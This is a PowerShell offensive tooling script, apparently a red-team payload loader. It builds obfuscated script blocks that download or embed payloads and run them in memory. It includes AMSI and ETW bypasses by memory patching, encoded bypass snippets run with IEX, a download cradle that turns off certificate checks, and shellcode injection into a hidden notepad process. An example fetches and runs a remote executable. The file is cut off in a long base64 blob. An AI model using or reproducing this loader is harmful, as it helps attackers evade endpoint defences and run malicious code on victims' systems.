#requires -version 3

Function New-PowerLoader {
<#
.SYNOPSIS
    Build script block which safely loads PowerShell, .NET assembly, PE or shellcode.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    New-PowerLoader builds PowerShell script block embedding download cradle or local file as payload.
    Resulting script block is fully compatible with PowerShell v2.

.PARAMETER Type
    Specifies the payload type, defaults to PoSh.

.PARAMETER FilePath
    Specifies a local payload.

.PARAMETER FileUrl
    Specifies a remote payload.

.PARAMETER ArgumentList
    Specifies the payload arguments.

.PARAMETER Bypass
    Specifies the bypass techniques to include.

.PARAMETER ClearComments
    Removes comments from PowerShell payload to be loaded.

.EXAMPLE
    PS C:\> New-PowerLoader -Type NetAsm -FilePath .\SharpSample.exe -Bypass ETW,AMSI | Invoke-PowerExec -ComputerList 192.168.0.2

.EXAMPLE
    PS C:\> $payload = New-PowerLoader -Type PE -FileUrl 'https://192.168.0.1/sample.exe' -Bypass SBL,PML,AMSI
    PS C:\> & $payload
#>
    [CmdletBinding()]
    Param (
        [ValidateSet("PoSh","NetAsm","PE","Shellcode")]
        [string]
        $Type = "PoSh",

        [ValidateScript({Test-Path $_ -PathType Leaf})]
        [string]
        $FilePath,

        [string]
        $FileUrl,

        [ValidateNotNullOrEmpty()]
        [string[]]
        $ArgumentList,

        [ValidateSet("AMSI","ETW","SBL","PML","PRM")]
        [string[]]
        $Bypass,

        [Switch]
        $ClearComments
    )

    $srcCode = ${function:Get-DecodedByte}.Ast.Extent.Text + [Environment]::NewLine
    if ($FilePath) {
        $bytes = [IO.File]::ReadAllBytes((Resolve-Path $FilePath))
        if ($ClearComments -and $Type -eq "PoSh") {
            $bytes = Remove-PoshComments($bytes)
        }
        $bytes = $bytes | foreach {$_ -bxor 1}
        $encCode = Get-EncodedByte($bytes)
        $srcCode += '$code = Get-DecodedByte("' + $encCode + '") | foreach {$_ -bxor 1}' + [Environment]::NewLine
    }
    elseif ($FileUrl) {
        $srcCode += ${function:Invoke-DownloadByte}.Ast.Extent.Text + [Environment]::NewLine
        $bytes = [Text.Encoding]::UTF8.GetBytes($FileUrl)
        $bytes = $bytes | foreach {$_ -bxor 1}
        $encUrl = Get-EncodedByte($bytes)
        $srcCode += '$code = Invoke-DownloadByte([Text.Encoding]::UTF8.GetString((Get-DecodedByte("' + $encUrl + '") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
        if ($ClearComments -and $Type -eq "PoSh") {
            $srcCode += ${function:Remove-PoshComments}.Ast.Extent.Text + [Environment]::NewLine
            $srcCode += '$code = Remove-PoshComments($code)' + [Environment]::NewLine
        }
    }
    else {
        Write-Error "Either FilePath or FileUrl parameter must be specified" -ErrorAction Stop
    }

    if ($ArgumentList) {
        $xargs = $ArgumentList -join ','
        $bytes = [Text.Encoding]::UTF8.GetBytes($xargs)
        $bytes = $bytes | foreach {$_ -bxor 1}
        $encArgs = Get-EncodedByte($bytes)
        $srcArgs = '$xargs = ([Text.Encoding]::UTF8.GetString((Get-DecodedByte("' + $encArgs + '") | foreach {$_ -bxor 1}))).Split('','')' + [Environment]::NewLine
    }
    else {
        $srcArgs = '$xargs = $null' + [Environment]::NewLine
    }

    $srcBypass = ''
    if ($Bypass -Contains 'AMSI' -or $Bypass -Contains 'ETW') {
        $srcBypass += ${function:Invoke-MemoryPatch}.Ast.Extent.Text + [Environment]::NewLine
    }
    switch ($Bypass) {
        'AMSI' {
            $srcBypass += '$d = ([Text.Encoding]::UTF8.GetString((Get-DecodedByte("H4sIAAAAAAAEAEvIKcrQT83NBQCpd2pDCAAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
            $srcBypass += '$f = ([Text.Encoding]::UTF8.GetString((Get-DecodedByte("H4sIAAAAAAAEAHPIKcoISkrIdy5JT08pBgCSRCbiDgAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
            $srcBypass += 'if ([IntPtr]::Size -eq 4) {$p = (Get-DecodedByte("H4sIAAAAAAAEANsZxsjWeFiSEQCkiImCCAAAAA==") | foreach {$_ -bxor 1})} else {$p = (Get-DecodedByte("H4sIAAAAAAAEANsZxsjWeAgANMiX0AYAAAA=") | foreach {$_ -bxor 1})}' + [Environment]::NewLine
            $srcBypass += 'Invoke-MemoryPatch -Dll $d -Func $f -Patch $p' + [Environment]::NewLine
        }
        'ETW' {
            $srcBypass += '$d = ([Text.Encoding]::UTF8.GetString((Get-DecodedByte("H4sIAAAAAAAEAMsvTc3N1QdiALm3ONgJAAAA") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
            $srcBypass += '$f = ([Text.Encoding]::UTF8.GetString((Get-DecodedByte("H4sIAAAAAAAEAHMpLXMpT8kvDSvOKE0BAGFTlzkNAAAA") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
            $srcBypass += 'if ([IntPtr]::Size -eq 4) {$p = [byte[]] (0xC2, 0x14, 0x00, 0x00)} else {$p = [byte[]] (0xC3)}' + [Environment]::NewLine
            $srcBypass += 'Invoke-MemoryPatch -Dll $d -Func $f -Patch $p' + [Environment]::NewLine
        }
        'SBL' {
            $srcBypass += '$b = "H4sIAAAAAAAEABXMQQrCMBCF4bO4MLRgyRWKgiKIxYoIpYuQjjXVTEInGQnSwxt3b/G+n0P6dld49rImAjtgknvgW5qhFG0iBitPyqsRLHiWdWRnFRvnZauDmXmHTr9E8TcHA/goBZnRK44BSFSicf4SBzS6Is5M52cLfFcYoVz7iFiVDXw25+ENmldi6xDzyHnKRQ/BaHlUNGXTEQfjx14UxaIV6+m7/ADzwv6nuwAAAA=="' + [Environment]::NewLine
            $srcBypass += 'IEX ([Text.Encoding]::UTF8.GetString((Get-DecodedByte($b) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
        }
        'PML' {
            $srcBypass += '$b = "H4sIAAAAAAAEAI3MsQqDMBAG4GfpIFQoZC+dxDrZIaEPEMKvnsNdMPFExYcXOjv0e4BP87qXDfTRSjczbi2FLEkGNVYWZDeC2XyVmHS9m4/0liYwRdQbwqwk8Q31xOlVDJ4Tnr/MOhf9RPG6qyTjn+sIXsO4HydzXsS6pAAAAA=="' + [Environment]::NewLine
            $srcBypass += 'IEX ([Text.Encoding]::UTF8.GetString((Get-DecodedByte($b) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
        }
        'PRM' {
            $srcBypass += '$b = "H4sIAAAAAAAEAMtI13RLKdXxyUstyU1RDAwKTklIzc3IT1HUccjN1agKTsnJK0/BJu2eV5yUUgMA4MdDiD8AAAA="' + [Environment]::NewLine
            $srcBypass += 'IEX ([Text.Encoding]::UTF8.GetString((Get-DecodedByte($b) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
        }
    }
    if ($srcBypass) {
        # Skiping bypass procedures if Powershell version is below 5
        $srcBypass = 'if ($PSVersionTable.CLRVersion.Major -gt 3) {' + [Environment]::NewLine + $srcBypass + '}' + [Environment]::NewLine
    }

    switch ($Type) {
        'PoSh' {
            $srcLoader = ${function:Invoke-PoshLoader}.Ast.Extent.Text + [Environment]::NewLine
            $srcLoader += 'Invoke-PoshLoader -Code ([Text.Encoding]::UTF8.GetString($code)) -ArgumentList $xargs'
        }
        'NetAsm' {
            $srcLoader = ${function:Invoke-NetLoader}.Ast.Extent.Text + [Environment]::NewLine
            $srcLoader += 'Invoke-NetLoader -Code $code -ArgumentList $xargs'
        }
        'PE' {
            $srcLoader = ${function:Invoke-PeLoader}.Ast.Extent.Text + [Environment]::NewLine
            $srcLoader += 'Invoke-PeLoader -Code $code -ArgumentList $xargs'
        }
        'Shellcode' {
            $srcLoader = ${function:Invoke-ShellLoader}.Ast.Extent.Text + [Environment]::NewLine
            $srcLoader += 'Invoke-ShellLoader -Code $code'
        }
    }
    $script = $srcCode + $srcArgs + $srcBypass + $srcLoader
    $words = @('Get-DecodedByte','Copy-Stream','Invoke-DownloadByte','Invoke-MemoryPatch','Invoke-PoshLoader','Invoke-NetLoader','Invoke-PeLoader','ReflectivePE','Invoke-ShellLoader','Remove-PoshComments')
    $script = Get-ObfuscatedString -InputString $script -BlackList $words
    return [ScriptBlock]::Create($script)
}

Function Local:Remove-PoshComments {
    Param (
        [byte[]] $Bytes
    )
    $strBytes = [BitConverter]::ToString($Bytes)
    $strBytes = $strBytes -replace "3C-23-(.*?)-23-3E"
    $strBytes = $strBytes -replace "23-(.*?)-0A","0A"
    $strBytes = $strBytes -replace "-"
    $byteArray = New-Object Byte[] ($strBytes.Length / 2)
    for ($i = 0; $i -lt $strBytes.Length; $i += 2) {
        $byteArray[$i/2] = [convert]::ToByte($strBytes.Substring($i, 2), 16)
    }
    return $byteArray
}

Function Local:Get-ObfuscatedString {
    Param (
        [String] $InputString,
        [String[]] $BlackList
    )
    foreach($word in $BlackList) {
        $string = -join ((0x41..0x5A) + (0x61..0x7A) | Get-Random -Count 11 | %{[char]$_})
        $InputString = $InputString.Replace($word,$string)
    }
    return $InputString
}

Function Local:Get-EncodedByte {
    Param (
        [Parameter(Mandatory = $True)]
        [byte[]] $ByteArray
    )
    [IO.MemoryStream] $output = New-Object IO.MemoryStream
    $gzipStream = New-Object IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
    $gzipStream.Write($ByteArray, 0, $ByteArray.Length)
    $gzipStream.Close()
    $output.Close()
    $out = $output.ToArray()
    return [Convert]::ToBase64String($out)
}

Function Local:Get-DecodedByte {
    Param (
        [Parameter(Mandatory = $True)]
        [string] $EncBytes
    )
    Function Copy-Stream ($InputStream,$OutputStream) {
        $buffer = New-Object byte[] 4096
        while (($bytesRead = $InputStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $OutputStream.Write($buffer, 0, $bytesRead)
        }
    }
    $byteArray = [Convert]::FromBase64String($EncBytes)
    $input = New-Object IO.MemoryStream(,$byteArray)
    $output = New-Object IO.MemoryStream
    $gzipStream = New-Object IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
    Copy-Stream -InputStream $gzipStream -OutputStream $output
    $gzipStream.Close()
    $input.Close()
    return $output.ToArray()
}

Function Local:Invoke-MemoryPatch {
    Param (
        [string] $Dll,
        [string] $Func,
        [byte[]] $Patch
    )
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
    $address = [Kernel32]::GetProcAddress([Kernel32]::LoadLibrary($Dll), $Func)
    $a = 0
    [Kernel32]::VirtualProtect($address, [UInt32]$Patch.Length, 0x40, [ref]$a) | Out-Null
    try {
        [Runtime.InteropServices.Marshal]::Copy($Patch, 0, $address, [UInt32]$Patch.Length)
    }
    catch {
        Write-Warning "Memory patch failed."
    }
    finally {
        [Kernel32]::VirtualProtect($address, [UInt32]$Patch.Length, $a, [ref]0) | Out-Null
    }
}

Function Local:Invoke-DownloadByte {
    Param (
        [Parameter(Mandatory=$True)]
        [string] $URL
    )
    $code = $null
    try {
        [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
        try {
            [Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([Net.SecurityProtocolType], 3072)
        }
        catch {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls
        }
        $client = [Net.WebRequest]::Create($URL)
        $client.Proxy = [Net.WebRequest]::GetSystemWebProxy()
        $client.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials
        $client.UserAgent = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)'
        $response = $client.GetResponse()
        $respStream = $response.GetResponseStream()
        $buffer = New-Object byte[] $response.ContentLength
        $writeStream = New-Object IO.MemoryStream $response.ContentLength
        do {
            $bytesRead = $respStream.Read($buffer, 0, $buffer.Length)
            $writeStream.Write($buffer, 0, $bytesRead)
        }
        while ($bytesRead -gt 0)
        $code = New-Object byte[] $response.ContentLength
        [Array]::Copy($writeStream.GetBuffer(), $code, $response.ContentLength)
        $respStream.Close()
        $response.Close()
    }
    catch [Net.WebException] {
        Write-Error $_
    }
    return $code
}

Function Local:Invoke-PoshLoader {
    Param (
        [Parameter(Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [string] $Code,

        [string[]] $ArgumentList
    )
    Invoke-Expression "$Code $($ArgumentList -join ' ')"
}

Function Local:Invoke-NetLoader {
    Param (
        [Parameter(Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [byte[]] $Code,

        [string[]] $ArgumentList
    )
    $realStdOut = [Console]::Out
    $realStdErr = [Console]::Error
    $stdOutWriter = New-Object IO.StringWriter
    $stdErrWriter = New-Object IO.StringWriter
    [Console]::SetOut($stdOutWriter)
    [Console]::SetError($stdErrWriter)
    $assembly = [Reflection.Assembly]::Load([byte[]]$Code)
    $al = New-Object -TypeName Collections.ArrayList
    $al.add($ArgumentList) | Out-Null
    try {
        $assembly.EntryPoint.Invoke($null, $al.ToArray())
    }
    catch [Management.Automation.MethodInvocationException] {
        Write-Warning $_
    }
    finally {
        [Console]::Out.Flush()
        [Console]::Error.Flush()
        [Console]::SetOut($realStdOut)
        [Console]::SetError($realStdErr)
        $output = $stdOutWriter.ToString()
        $output += $stdErrWriter.ToString();
        Write-Output $output
    }
}

Function Local:Invoke-ShellLoader {
    Param (
        [Parameter(Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $Code
    )
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(UInt32 processAccess, bool bInheritHandle, int processId);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, int flAllocationType, int flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, ref UInt32 lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
    [DllImport("ntdll.dll")]
    public static extern UInt32 NtCreateThreadEx(
        ref IntPtr hThread,
        UInt32 DesiredAccess,
        IntPtr ObjectAttributes,
        IntPtr ProcessHandle,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        bool CreateSuspended,
        UInt32 StackZeroBits,
        UInt32 SizeOfStackCommit,
        UInt32 SizeOfStackReserve,
        IntPtr lpBytesBuffer
    );
}
"@
    $procStart = [wmiclass]"\\.\root\cimv2:Win32_ProcessStartup"
    $procStart.Properties["ShowWindow"].Value = 0
    $procID = (([wmiclass]"\\.\root\cimv2:Win32_Process").Create("notepad.exe", $null, $procStart)).ProcessId
    $hProc = [Win32]::OpenProcess(0x001F0FFF, $false, $procID)
    $address = [Win32]::VirtualAllocEx($hProc, 0, $Code.Length + 1, 0x1000 -bor 0x2000, 0x04)
    [Win32]::WriteProcessMemory($hProc, $address, $Code, $Code.Length, [ref] 0) | Out-Null
    [Win32]::VirtualProtectEx($hProc, $address, $Code.Length, 0x20, [ref] 0) | Out-Null
    $hRemoteThread = [IntPtr]::Zero
    [Win32]::NtCreateThreadEx([ref]$hRemoteThread, 0x1FFFFF, [IntPtr]::Zero, $hProc, $address, [IntPtr]::Zero, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero) | Out-Null
    if ($hRemoteThread -ne [IntPtr]::Zero) {
        Write-Output "Successful injection."
        [Win32]::CloseHandle($hRemoteThread) | Out-Null
    }
    [Win32]::CloseHandle($hProc) | Out-Null
}

Function Local:Invoke-PeLoader {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $Code,

        [String[]]
        $ArgumentList
    )
    if ((($Code[0..1] | ForEach-Object {[Char] $_ }) -join '') -ne 'MZ') {
        throw 'PE is invalid.'
    }
    $Code[0] = 0
    $Code[1] = 0
    if ($ArgumentList) {
        $xargs = $ArgumentList -join '" "'
        $xargs = "ReflectivePE `"$xargs`""
    }
    else {
        $xargs = "ReflectivePE"
    }
    $encScriptBlock = "H4sIAAAAAAAEAO19a3PbOLLoD5g/cVguu6Q51pFtjSfrk3zQyvJYOWXLZSnyTHJ9XLwyZNFZkVqLYuLsnf3vF40HiSdJUJST7EY1NbFEorvRLzQaQOMnD3+u/dhfeM2fPPb5QH5ACYqb19EqSIJo6b3xDlvehb+c+UkUP+Ovu0m8Ro3brNHpc4I+3GY/7F734adV66cCwAcFgEdJHCwfBMD9L6gbP6zIDw0K/Xy9nBJwv6Fk/yZYHnUmz09o5f0jayX8+sa7Qp/2h/d/Q9PEGz2vErRo02/Z62fRwg+AvA/dpyf65fb16946jtEyod+Fl5+X/iKYdlcrtLgPn40IxmgeIkJkm793hZnR3FMa7zUyuPy303UQzlAM3KGo22doHiyR0rSpEtLyPgho+4sgaSsgu9MpWq1wz8brpYD4IpqtQySgVZrJ+OnbaU/o172Wtzv3wxUSwPai5QqLd4pFPVjOI+AuxpsEC9QeLLFaRE8jFH8OMEntCz9ePfphd9VNsPzv1wm6bWPhChBWzcaHQ0EtQLYCxVIXGL395XrR3LvwH4IpvI1J3Lte34fBFP/14R0m4eDVbcMIkQG4DDCVftjcG1x0f+vfXU3uhteTwfCqe3n39mx81LnDPw96AjTv8MvB4X3D+6c3XCf7V+swrA7+1bEJfMcGPu0mcEPE1YuRnyD4pdkw2sc/ve5stn+BBY5Zyf4lgK6iBF1jKaE4efb2QX29DMv+7364RgLeCqIZre+pudQintG709Efo0n/4u7d1f9cDW+uJM5VFEoG9Ko7GfzeF2EebAzzZnB1NrwZ3f32biAC7tQGuCcDPtoY8PVwNHivgv21Pnr7Ki/+sjHs/vngrnt9fTnodcG6JAlurhYA/XQ4nNyN+uPfB5j+szFWk7GEZXNFASzjd1eTwYURweYKQxAMLySom2vL+9PhewnksRmk5Ai26sBkTNyJSb9WcGRnYdh7xNHOFPMhWCXBdLWhRxv3R3eHsuc/PDx01yOAc6DBcVcXgNPR4FikWQDnSINzUlHRzi4v73pvu+Nub9IfD0aTQW90d/bHVfdi0Ls77Y76KqLjquZuQnQ+HGNrH1xN+r+NB5M/VFwndeK6wi53eHHdnShYDg43wKIhGd4NRsNLzUliPJ2a8Yz6bxUMxzVjOMUDioLipAIK0NdjNcCrk9SbswuDQ4c4r04s+K+LAcSVMEj1x3fdm+5YsY4TK0Kzc9uql7ag5O7a/FiYSPFJBEz+9rrrJLr0n6N10vK6y1XQC/3VquWxf6iDbnn9L0/43yDhb46QH6JZyztF8yhG5wEKZ4NlkOw5jQ6EHVws3Un37mww7vcmwzG4C4FMLAnSNXj/tuWdZBxsGuRNiGnu/R7EyRrPmWazGE/quDSPOrfZsNNotEcoGc7nK5Q0zeLNQTAK/h8qBmsZBEyd3qrOGBFyjTE93ExfRujva4Qns364NY05H1z27972u2fEOdjVpXOYG1QwaV7400f8TbB6QaAlPQ0DdbUGQQznI5pqWNUBcxIs0BnWhlHiL57MWucG8DoKIMkwiUbPi/sonPj3oUWbK3aegLXYnRtIMLThfPgEzPTDt8jHb9TBU8VJOoDUFPAFTFfEJtut8OQbd/JZAodQ++o433CPD0t5epJjAUhpsqUuF3/h/y2KL4PlRxT/juIV1j9QEsjk2ty9ee6QhyJYOqIwzzsLBqrhvBfNKg9XhcBBLbCvx3/PsJfyi/GY5zSFeN4tA1dMltl/DioWMgzn/WUSPxNHWQLNK1c0p/6qtFg6zqo7WPgPCFBw4K+OrcDdhU5Htm4YPCwXqAx7jpylcB6EyAWBM/+JcQ+xo/WTYPlAExyCCepDgWQn7r4EDL0yOne/Ar0jSlAeibMekD45Iqkmp9H6fuXIMmcXQ3rjjugXZ1UgcQCDTwa8YvX+xVkBmGMG4ZQA7ywVCp4GYyVmV6+cmdR7RNOPo/WiBGx3/8WFDFGDlN20oXBWJn0SDrjMU3ML0l8rTUlx6J34049jtELx5xLe/9eKmkWw9KLFIkiKkVjSfWX066l0T04qBhWApGxH/uJsKJcRmMh56D+UMJMDS9I4Bz6fcI0/+93lDHpUCo8zr/DkIIoTPk80pgxsyNxDsMGiMjL3UAkrWLSOp6gaugqMnCIyl62Ezz3O6eGpZDAPpjAhrYLRPSyAsHOMwgijrNpN9/HuDN2vH1zRuA9L3Xj6GCQ4/l3Hzp1yH0V+C6N7P7xOYldUvzqryeRyVElSJ87qAR6xFy3nwUMlhH9xVo3TaL2cUZfiiMy2spPnusgylBsS9+gChf4z7dEZWk3j4CmJXHWk4z5l7V2O2RalNAvnhNF9pskG/5krJst8c9eSh3qB/J2OU87iac+/r1zeUSc/l4dF/yOX9yOX9yOXVyGXR6GXY5G7i9UyhTnA3UX9I1P4I1P4I1P4I1P4I1P4nWQK7dyrMVOYg6S6fqmZwpyIZYN0ZNmOVJsXl84Uuic7KyUK3Sfb1fOE7rnVDdKE7onWjdKE7pHrZmlC9yBz0zShe2xYQ5rQPZarlCZ0j3c2SRO6j+CV04Tug23VNKH7uLhhmtB9IKmeJqyQBHVPE1ZIfNaSJnRPgW6aJnTPh1ZNE1pm+uaU3FHn5dOEGGdumvCo883v072aMFpHRfv9Xh2X2ak7wjN9n/nVjfeWQu5AVVJhP2VluNpuVVuWt9xWU5GHL6CEEjpZ/8RH35HqFaWnj0/+3VTvqOOqei/i/yR0NtX7Drze2XBU5nBCOZeH7hZsXWTjTe/obnofPtUEqS44cVhX3578+HFWy+kAzPMAWxGentQEzf9SI7RVLadKMJy6RLjK8m+bQQpqo6geOOHcr009o8/LyAESuovRijRWHa8CN0ZCZz/cZoBb3lufQmAlRPbMBUion82pQPJuufCX/gOaEb/1+vXpM27SjWP/OYNH8JDfMKS/Nl2rmQiZNkIZDtVVL5/539ySMqS2S2+9SqJFioI1baplV1o6H1piV1rQEzrSe8ciRZlwYEKhYGvKBJfz8RFaBLOaFA2Dwp1z1bVOSWXrfAPa9k1oxMGhphKdWnUCe58l+gTsLhdtqsHHS5wpzZAp50nTB998tDbq9yA4LhOxiYfSdpeYDcU2A8wCEcKCzr+3vZw0TMyrx1jYgW/7sWw3J1rm/HiVc6xj/5N9J0fFM7xbgZlm5mvpfAr3Ev+2JEtRtcBNV7V0cus4w22gdgtHjks7dtlPvYBzVxDKDl5++M07eah5czfuXw7TSlelaky8vIs4xar80Vk3lO69gHKoGGXtUJ5+8+oxuLgejid3Z/1Rbzy4ngzrqCpR3d7tC3B1V4I4j+JPfox/xsQGy1p8Mot3Ns+Qxqtk8rheuhuDJswXMAcdp2wQ2vNv3iT67ynFpcryHP/LWATZR5i7q88RHmwXrBFeXfZl3/RbLVjihYdrDeygs7UATLeC10pmCrV+OgHiMJ5BFto9UlRN9wX8n4ZSdn/q4xRrjJJ1vBSRk0d/2qpZk9mmv0z0itbZkzJVrZUmToV++xdQcvBiMOGdJJUaoeLgYW0Ixn1Sj07G0KkLwzVZUht2e73+aCTgOKgP+hjPC4ZXl38I0Dv1Qr8ZDyYig47rA09A94bXIvUn9YHvv+/33om0H9QoVgacsCjD0NkSBkUIx1tAYxDGSa1m0Ov23vZFVtUDnXo+PAkis6Gzu+7paHgpin0rWN4Ofnt7ObzhSI62ggT78WxzSE3Ky9IKvas78H+aiYDvO6zL/8m4ZEs53h4ixVhOtofpaji5I2p9JjrI2tGRLStUVN3TS5jl4F+lMaseny9gO7u8lJWiRgSG8rBizeTa3Zy9Si8vaiwOEXUGF5d9qT8nIh+lkCxFkh+WpWG1FpZlT8qEZTyrBpslIBbGjQAH7sOUhcbeRxQvUXjUac/C0BPfN0M5QyF6wNEug8S/EvbQtYnrJL5lEbbwJwm2+V8NL32zYUZT4gaP29evMQWcgPMo5qxh6fGm1vuWuStqzJ6xWFIEg/AlinmEbubhAi2mT88WGSxWn6dxQiRA31Pblea6zn8zrynYWric9aylkluSswUmxmjl/DVwaIWSUpzF76ntXDhLdbiIrxhoXXxl/WqpxNbGV6BV4KvEHzgzcBncx35sU1vJdYivG4EUcJrdxmRmqwCmFt4qfWsZCa2HyyLpnNXCbxkOTLLA3DIsl1vYIJXW8FwJyDBrEYLe4ZaN9npEofSBS6McGylL6hMLhefq2MsIhz7fgogyFmiCknuzDXGxXpmFRh9qocR5jJBD2AOvG2FsEPSAwE6jKDQEOgC5zjiH97ZlpH3jKIeQqwQ5Ro7h5nBaz4HxrIUNUi0xJ2bnR3T6PEZzmqjNEQxDW6dsBJ60bN3bWEKcbkVIGncxyXS16q2/nIWlLERtYgW2ySivgKrLg6l9bVmJri4BlXTBTYm/Cxt8seU4RFfC60YY5UzEpPMCkFoYrnSsZSSzngFCJJ0z3MgotkDziP+ZWbj9PyK3xffNUCpMyGyTtEIvpRuKSEktQlMZ1DL3th6xSdRzuRlZLqVOUmTG1Mlofb8PR8rQDDOhu3q3XJEvQv5EvY0WPpVupCUNB6SyrfTbLunKgXAvrR1Fwd20+SiyJGAmEH5NLiOC3JALqnEawNWmnzH7UUz1gDxqsvdsADolAXQMAM5hlbWwPS8OLOx0COZeU6S/3YuwYnv76O+eSBX9uSGIlhqFH8fPw89kN8ah9GgexRhwAL//t4f/3Q8TT8cDj37+WQXLuQ5CEpp82A1uvX0BqdaId0bA1kmbmrCkmH5+43V+eWV+LnbyQHvlT+0XFK6QDZedYWZYfK/F7mi9YOwAFihd07mX6QPh2huPANi/x/pPktrn51KbDHH2l6Eb2FVEn7ydnr9cRom3Wt8nsBfGu8d4fNgqvfKiuTcL5nMEFyt7K6jRsmMAzXyMqqeTiKhnU6C+5TFdVX0PuL4fvueH79mG7zEYneSDftYMEH6yuyVXa+S8aUqvnZ9DJQtgDllJsbqzr+WuKvkQfzb7Ku6jFy2e/BhBJHTwGwmD4smjDzXqOtiZYDg/HMmLOZKN3EBm6yYQ3gF1AA+IuoL9fZPZqATQQOOhfAjBY2YQRkmLM+N0CFs4zrmPoW3DNKfURIh5ejb7zDFPgTLTmutb9GVbNkZZaNB1+gAOKZSbwdHjDM0PZIcwbQwnffk08T89YWsA9OeNt3P45R+Hr9/vNjNUjT93vP05t0qFNs4r3NrIqQlaJTC1w50d+8sHhFsH2wtyWKZIZiapOEaf1Oah6Jq5gui6T47jlcHRKecFYQov4xglfpyw/EMOJv7XCCVk+owFC6LcaXkCEUeVicCgTJ6YvUzHr/5yJiz8sEdNW9jblHrWgO+geoLqX/cliIzb7exHyR83iwfIJgdx3aeJtoZKBY1WKF/MrmYSP2O18pLI+xQH2M3gPxZE2b3Vwg9DHHckGKlHCk9gEmYQL5AOxGAMbUk5Ta6odFcUljdI74Tvm3TlgeLcoCuqV7gBDPtkiJhE1DtszSew0V3WYBpc1Riv6EZCu6XqZqbQdOCnhdBYpM++kFGUhgGXaPmQPKaP9HC/xCBAmA3gmjJNLQ61xbB9YN+FrKFZfFr2skB2w3XytKajDh2KMANtrBcd1KHKaGisyTJtC26hKexvom83DxsNu6RFdAeeCZ+CbUwGPNJr7NZ+j4LZrUG4u2fRwg8A6Ifu0xP9gkXRW8cQedDvwsvPy+5qhRb34XPRwXD+Hnh1KLtHHqA02SoeYOevCueNKGJ23AFj9RfBlL/WFMloYcVSTqMr4LpTrGUr3CesgAJS6UQToFSaybjp2829wZJqJv0Op5xI7GU+z5R/cOriWdRMDGpPO7ZFD2kJB7vgvBf5E055XKzDJJj6qzT3LSXRs4P2AjX6URLhPSylyegJTQM/BKG1vLfBDJsjHgQ5TXsyt3vYxWIfSuYeS5K8hkguAScUY7oFfc8lDA71DxZPIYKq/ORgNqlsjMmhHoP4NahZIOrMBUoeo1lu1+grILPP0UfC4LSYQtYxrMOjMMKehS0ngkgzy7F1QsJehX46rlB3U3DcxuTTxLUdB5fG11pKOjVlQJngAUVzPMZAlip9SV9WGQswAc3WsXH+QR2S4Kzs7g0mGuzFAM+aG94/MzE94gkY93H/8Hbv2rSALofb86ePyNvvLmfw7JLVFWiPnsIgae797//uNT7sH9y2+3/HmoUVgnnJWRjuNYTYaRcHl/4cXeHGn5nWksBR7kM6H9q7CKZxtIrmSZssHbUNzUVT0ReeTQgBPLcYpYUCTN4plQ+LsJOykfKPBPkQ4e3IkHa8P/GLIwS+hTN8fw7HeoXU2i6sYx51sn4ohLapqTd3l+swhGoiTBOF6DyRAjgCNFk80R1FwnimbLkh71Ec2P+Zhz5LeJO2ajJELbkbDQmJ7BdkFmm9s4ZUKc7bjOiWYDANNW6CD9bd6aPCGydypG7lojO5NHKrxFXCbn/YZlJQj4D5vGq7s27l1CJ8BMNKuw4zvVLb32fRijYpl2LB3Z5EIzL0Ypk0s06z6FGgr62WZTJMnVN62W68wnkzT8sIk1j2E1+wyHrU5vWsGlYOuazJS7TyNXnxxwxJIKkhqaFbgbcibDt/xQq5SpJWJaOdFpT19pf8hOfxL79oixMJnSNj2yT5KwWRt+Jg2rZJvI5aLhPbJvetERee1c7NKsaejV8d3+GfB709bR2pugBVfqVCVImtC+F1/9XxaZBtNpPyzbmp3V3ZkZFSuC+gQUedxgszWyitWzOz5US7nu6WMNlj5P6pvwqmhJrSo0le/JuYIlNj0gajrjVtU2E4oRnDMuNI6tHT2nCM/HKKS04CvaVhcZP3nKWDhGGjGFAvenpOAbSA+xpFLU9FYKxroA6lhvBin49COhJvX6htYOIy562Liu8xHd/jSt6UqWyz57oEnbAM4+AB8qvZTX02fKqRq14+hbAhReKVYVVpEWDUQg2/YWwzeliLDSky3OlVlSwdlJP9wd7S1I5Vo2hoTph2Nsf7nqHED0IIA+t0wN9kPF/bSpodj3y0Fj5KxJg6NL